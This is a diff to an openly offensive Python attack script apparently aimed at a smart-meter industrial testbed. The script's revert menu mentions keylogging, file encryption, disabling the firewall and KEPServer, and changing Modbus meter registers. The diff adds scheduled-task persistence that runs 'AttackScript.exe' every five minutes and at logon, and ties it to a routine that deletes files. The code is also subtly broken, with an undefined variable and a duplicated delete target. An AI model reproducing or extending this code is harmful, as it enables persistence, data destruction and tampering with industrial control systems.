@@ -6,7 +6,7 @@ from pathlib import Path
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
-from subprocess import run, check_call, CalledProcessError, PIPE, check_output
+from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
 from ctypes import windll
 from sys import executable, argv
 from win32netcon import ACCESS_ALL
@@ -316,6 +316,19 @@ def runKeylogger():
     print("Keylogger running successfully.\nOk.")
     check_call([executable_path])
 
+def create_scheduled_task():
+    executable_file_path = r'C:\\Windows\\temp\\Smartmeter\\AttackScript.exe' #Help me change this
+
+    executable_file_parameters = '1'
+
+    task_name = 'Smart Meter Testing'
+    task_name2 = 'Smart Meter Testing 2'
+    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 5'
+    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon'
+
+    # Create the task using the schtasks command
+    subprocess.call(sch1, shell=True)
+    subprocess.call(sch2, shell=True)
 
 def revert(revertoption):
     # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
@@ -453,7 +466,6 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
             print("Modpoll pid:", pid, "has stopped. \nOk.")
 
     elif revertoption == "8":
-        
         for root, dirs, files in walk(copiedpath):
             for file in files:
                 og = path.join(root, file)
@@ -461,7 +473,23 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                 print("File: " + str(og) + " is deleted")
         rmdir(copiedpath)
         system('cmd /k "net share SmartMeterfolder /delete"')
+
+        netshare = run(['schtasks', '/query'], stdout=PIPE, stderr=PIPE, text=True)
+        if "Smart Meter Testing" in netshare.stdout:
+            task_name = 'Smart Meter Testing'
+            task_name2 = 'Smart Meter Testing 2'
+
+            # Define the command to delete the task using schtasks
+            schdel = f'schtasks /delete /tn "{task_name}" /f'
+            schdel2 = f'schtasks /delete /tn "{task_name}" /f'
+
+            # Delete the task using the schtasks command
+            subprocess.call(schdel, shell=True)
+            subprocess.call(schdel2, shell=True)
+
         print("Ok.")
+
+
     elif revertoption == "9":
         process_name = "keylogger"
         pid = 0
@@ -643,7 +671,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         print("Reverting everything successfull.\nOk.")
 
     elif revertoption == "-h":
-        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \n4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back, \n7 Kill Modpoll, \n8 remove shared folder, \n9 Kill Keylogger, \n10 Revert Everything.")
+        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \n4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back, \n7 Kill Modpoll, \n8 remove shared folder and scheduled task, \n9 Kill Keylogger, \n10 Revert Everything.")
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
@@ -651,6 +679,7 @@ if __name__ == '__main__':
     check_admin()
     attackoption = str(argv[1])
     if attackoption == "1":
+        create_scheduled_task()
         delete_files(smartmeterpath)
         print("\nOk.")
     elif attackoption == "2":
